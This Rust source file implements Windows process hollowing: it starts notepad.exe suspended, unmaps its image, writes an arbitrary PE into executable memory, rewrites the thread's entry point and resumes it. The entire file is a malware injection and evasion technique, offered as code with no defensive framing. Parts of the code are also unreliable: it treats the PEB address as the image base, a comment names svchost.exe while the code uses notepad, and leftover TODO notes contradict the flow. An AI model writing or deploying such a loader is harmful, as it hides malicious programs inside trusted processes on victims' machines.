use std::{mem, ptr};

use ntapi::{
    ntpsapi::{NtQueryInformationProcess, ProcessBasicInformation, PROCESS_BASIC_INFORMATION},
    ntzwapi::ZwUnmapViewOfSection,
};
use winapi::{
    shared::{minwindef::FALSE, ntdef::HANDLE, ntstatus::STATUS_ACCESS_DENIED},
    um::{
        handleapi::CloseHandle,
        memoryapi::{VirtualAllocEx, WriteProcessMemory},
        processthreadsapi::{
            CreateProcessA, GetThreadContext, ResumeThread, SetThreadContext, PROCESS_INFORMATION,
            STARTUPINFOA,
        },
        winbase::CREATE_SUSPENDED,
        winnt::{
            CONTEXT, CONTEXT_FULL, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS,
            IMAGE_SECTION_HEADER, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
            PROCESS_QUERY_INFORMATION, PVOID,
        },
    },
};

/// Create a suspended process that will be used to run the PE
unsafe fn create_process() -> Result<PROCESS_INFORMATION, String> {
    let app_name = std::ffi::CString::new("C:\\Windows\\System32\\notepad.exe").unwrap();

    let mut startup_info: STARTUPINFOA = std::mem::zeroed();
    startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

    let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

    if CreateProcessA(
        app_name.as_ptr(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        FALSE,
        CREATE_SUSPENDED | PROCESS_QUERY_INFORMATION,
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        &mut startup_info,
        &mut process_info,
    ) == 0
    {
        return Err(format!(
            "CreateProcessA failed: {}",
            std::io::Error::last_os_error()
        ));
    };

    Ok(process_info)
}

/// Get image base address that will be used to hollow the process
unsafe fn get_process_image_base(process_handle: HANDLE) -> Result<usize, String> {
    let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();

    let status = NtQueryInformationProcess(
        process_handle,
        ProcessBasicInformation,
        &mut pbi as *mut _ as PVOID,
        std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
        ptr::null_mut(),
    );

    if status == 0 {
        return Ok(pbi.PebBaseAddress as usize);
    }

    return Err("Failed to obtain process image base".to_string());
}

unsafe fn resume_thread(thread_handle: HANDLE) -> Result<(), String> {
    if ResumeThread(thread_handle) == u32::MAX {
        return Err(format!(
            "Failed to resume thread, error code: {}",
            std::io::Error::last_os_error()
        ));
    }

    Ok(())
}

unsafe fn hollow_process_memory(process_handle: HANDLE, base_addr: PVOID) -> Result<(), String> {
    if ZwUnmapViewOfSection(process_handle, base_addr) == STATUS_ACCESS_DENIED {
        return Err("Failed to hollow previous process memory".to_string());
    };

    Ok(())
}

unsafe fn parse_pe_headers(pe_data: &[u8]) -> Result<(usize, usize), String> {
    let dos_header = pe_data.as_ptr() as *const IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return Err("Invalid PE file".to_string());
    }

    let nt_headers =
        pe_data.as_ptr().offset((*dos_header).e_lfanew as isize) as *const IMAGE_NT_HEADERS;

    let size_of_image = (*nt_headers).OptionalHeader.SizeOfImage as usize;
    let image_base = (*nt_headers).OptionalHeader.ImageBase as usize;

    Ok((size_of_image, image_base))
}

unsafe fn allocate_pe_memory(process: HANDLE, pe_data: &[u8]) -> Result<(PVOID, usize), String> {
    let (size_of_image, preferred_base) = parse_pe_headers(pe_data)?;

    let allocated_addr = VirtualAllocEx(
        process,
        preferred_base as PVOID,
        size_of_image,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );

    if allocated_addr.is_null() {
        let allocated_addr = VirtualAllocEx(
            process,
            ptr::null_mut(),
            size_of_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if allocated_addr.is_null() {
            return Err(format!(
                "VirtualAllocEx failed: {}",
                std::io::Error::last_os_error()
            ));
        }
    }

    Ok((allocated_addr, size_of_image))
}

unsafe fn write_pe_to_process(
    process: HANDLE,
    base_address: PVOID,
    pe_data: &[u8],
) -> Result<(), String> {
    // Parse PE headers
    let dos_header = pe_data.as_ptr() as *const IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return Err("Invalid DOS header".to_string());
    }

    let nt_headers =
        pe_data.as_ptr().offset((*dos_header).e_lfanew as isize) as *const IMAGE_NT_HEADERS;

    // Write PE headers
    let mut bytes_written = 0;
    if WriteProcessMemory(
        process,
        base_address,
        pe_data.as_ptr() as PVOID,
        (*nt_headers).OptionalHeader.SizeOfHeaders as usize,
        &mut bytes_written,
    ) == 0
    {
        return Err(format!(
            "Failed to write PE headers: {}",
            std::io::Error::last_os_error()
        ));
    }

    // Write each section
    let section_header =
        (nt_headers as usize + mem::size_of::<IMAGE_NT_HEADERS>()) as *const IMAGE_SECTION_HEADER;

    for i in 0..(*nt_headers).FileHeader.NumberOfSections {
        let section = section_header.offset(i as isize);
        let section_data = pe_data
            .as_ptr()
            .offset((*section).PointerToRawData as isize);

        let target_address = (base_address as usize + (*section).VirtualAddress as usize) as PVOID;

        if WriteProcessMemory(
            process,
            target_address,
            section_data as PVOID,
            (*section).SizeOfRawData as usize,
            &mut bytes_written,
        ) == 0
        {
            return Err(format!(
                "Failed to write section {}: {}",
                std::str::from_utf8(&(*section).Name).unwrap_or("unknown"),
                std::io::Error::last_os_error()
            ));
        }
    }

    Ok(())
}

unsafe fn update_thread_context(
    thread: HANDLE,
    new_image_base: PVOID,
    pe_data: &[u8],
) -> Result<(), String> {
    let dos_header = pe_data.as_ptr() as *const IMAGE_DOS_HEADER;
    let nt_headers =
        pe_data.as_ptr().offset((*dos_header).e_lfanew as isize) as *const IMAGE_NT_HEADERS;

    let entry_point = (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize;
    let new_entry_point = new_image_base as usize + entry_point;

    let mut context: CONTEXT = mem::zeroed();
    context.ContextFlags = CONTEXT_FULL;

    if GetThreadContext(thread, &mut context) == 0 {
        return Err(format!(
            "GetThreadContext failed: {}",
            std::io::Error::last_os_error()
        ));
    }

    #[cfg(target_arch = "x86_64")]
    {
        context.Rcx = new_entry_point as u64;
    }
    #[cfg(target_arch = "x86")]
    {
        context.Eax = new_entry_point as u32;
    }

    if SetThreadContext(thread, &context) == 0 {
        return Err(format!(
            "SetThreadContext failed: {}",
            std::io::Error::last_os_error()
        ));
    }

    Ok(())
}

/// Execute process hollowing for our PE on svchost.exe process
pub unsafe fn execute_on_remote_thread(pe_data: &[u8]) -> Result<(), String> {
    let created_process = create_process()?;

    let image_base_addr = get_process_image_base(created_process.hProcess)?;

    hollow_process_memory(created_process.hProcess, image_base_addr as PVOID)?;

    let (new_base_addr, _size) = allocate_pe_memory(created_process.hProcess, pe_data)?;

    write_pe_to_process(created_process.hProcess, new_base_addr, pe_data)?;
    update_thread_context(created_process.hThread, new_base_addr, pe_data)?;

    resume_thread(created_process.hThread)?;

    // TODO:
    // 1. Get base address of the previous process
    // 2. Extract header information from PE
    // 3. Remove that entry point (base addr)
    // 4. Replace the process with our executable
    // 5. Set the entry point correctly for new executable
    // 6. Resume the thread

    // TODO: Only resume after everything is done
    // resume_thread(created_process.hThread).unwrap();

    CloseHandle(created_process.hProcess);
    CloseHandle(created_process.hThread);

    Ok(())
}
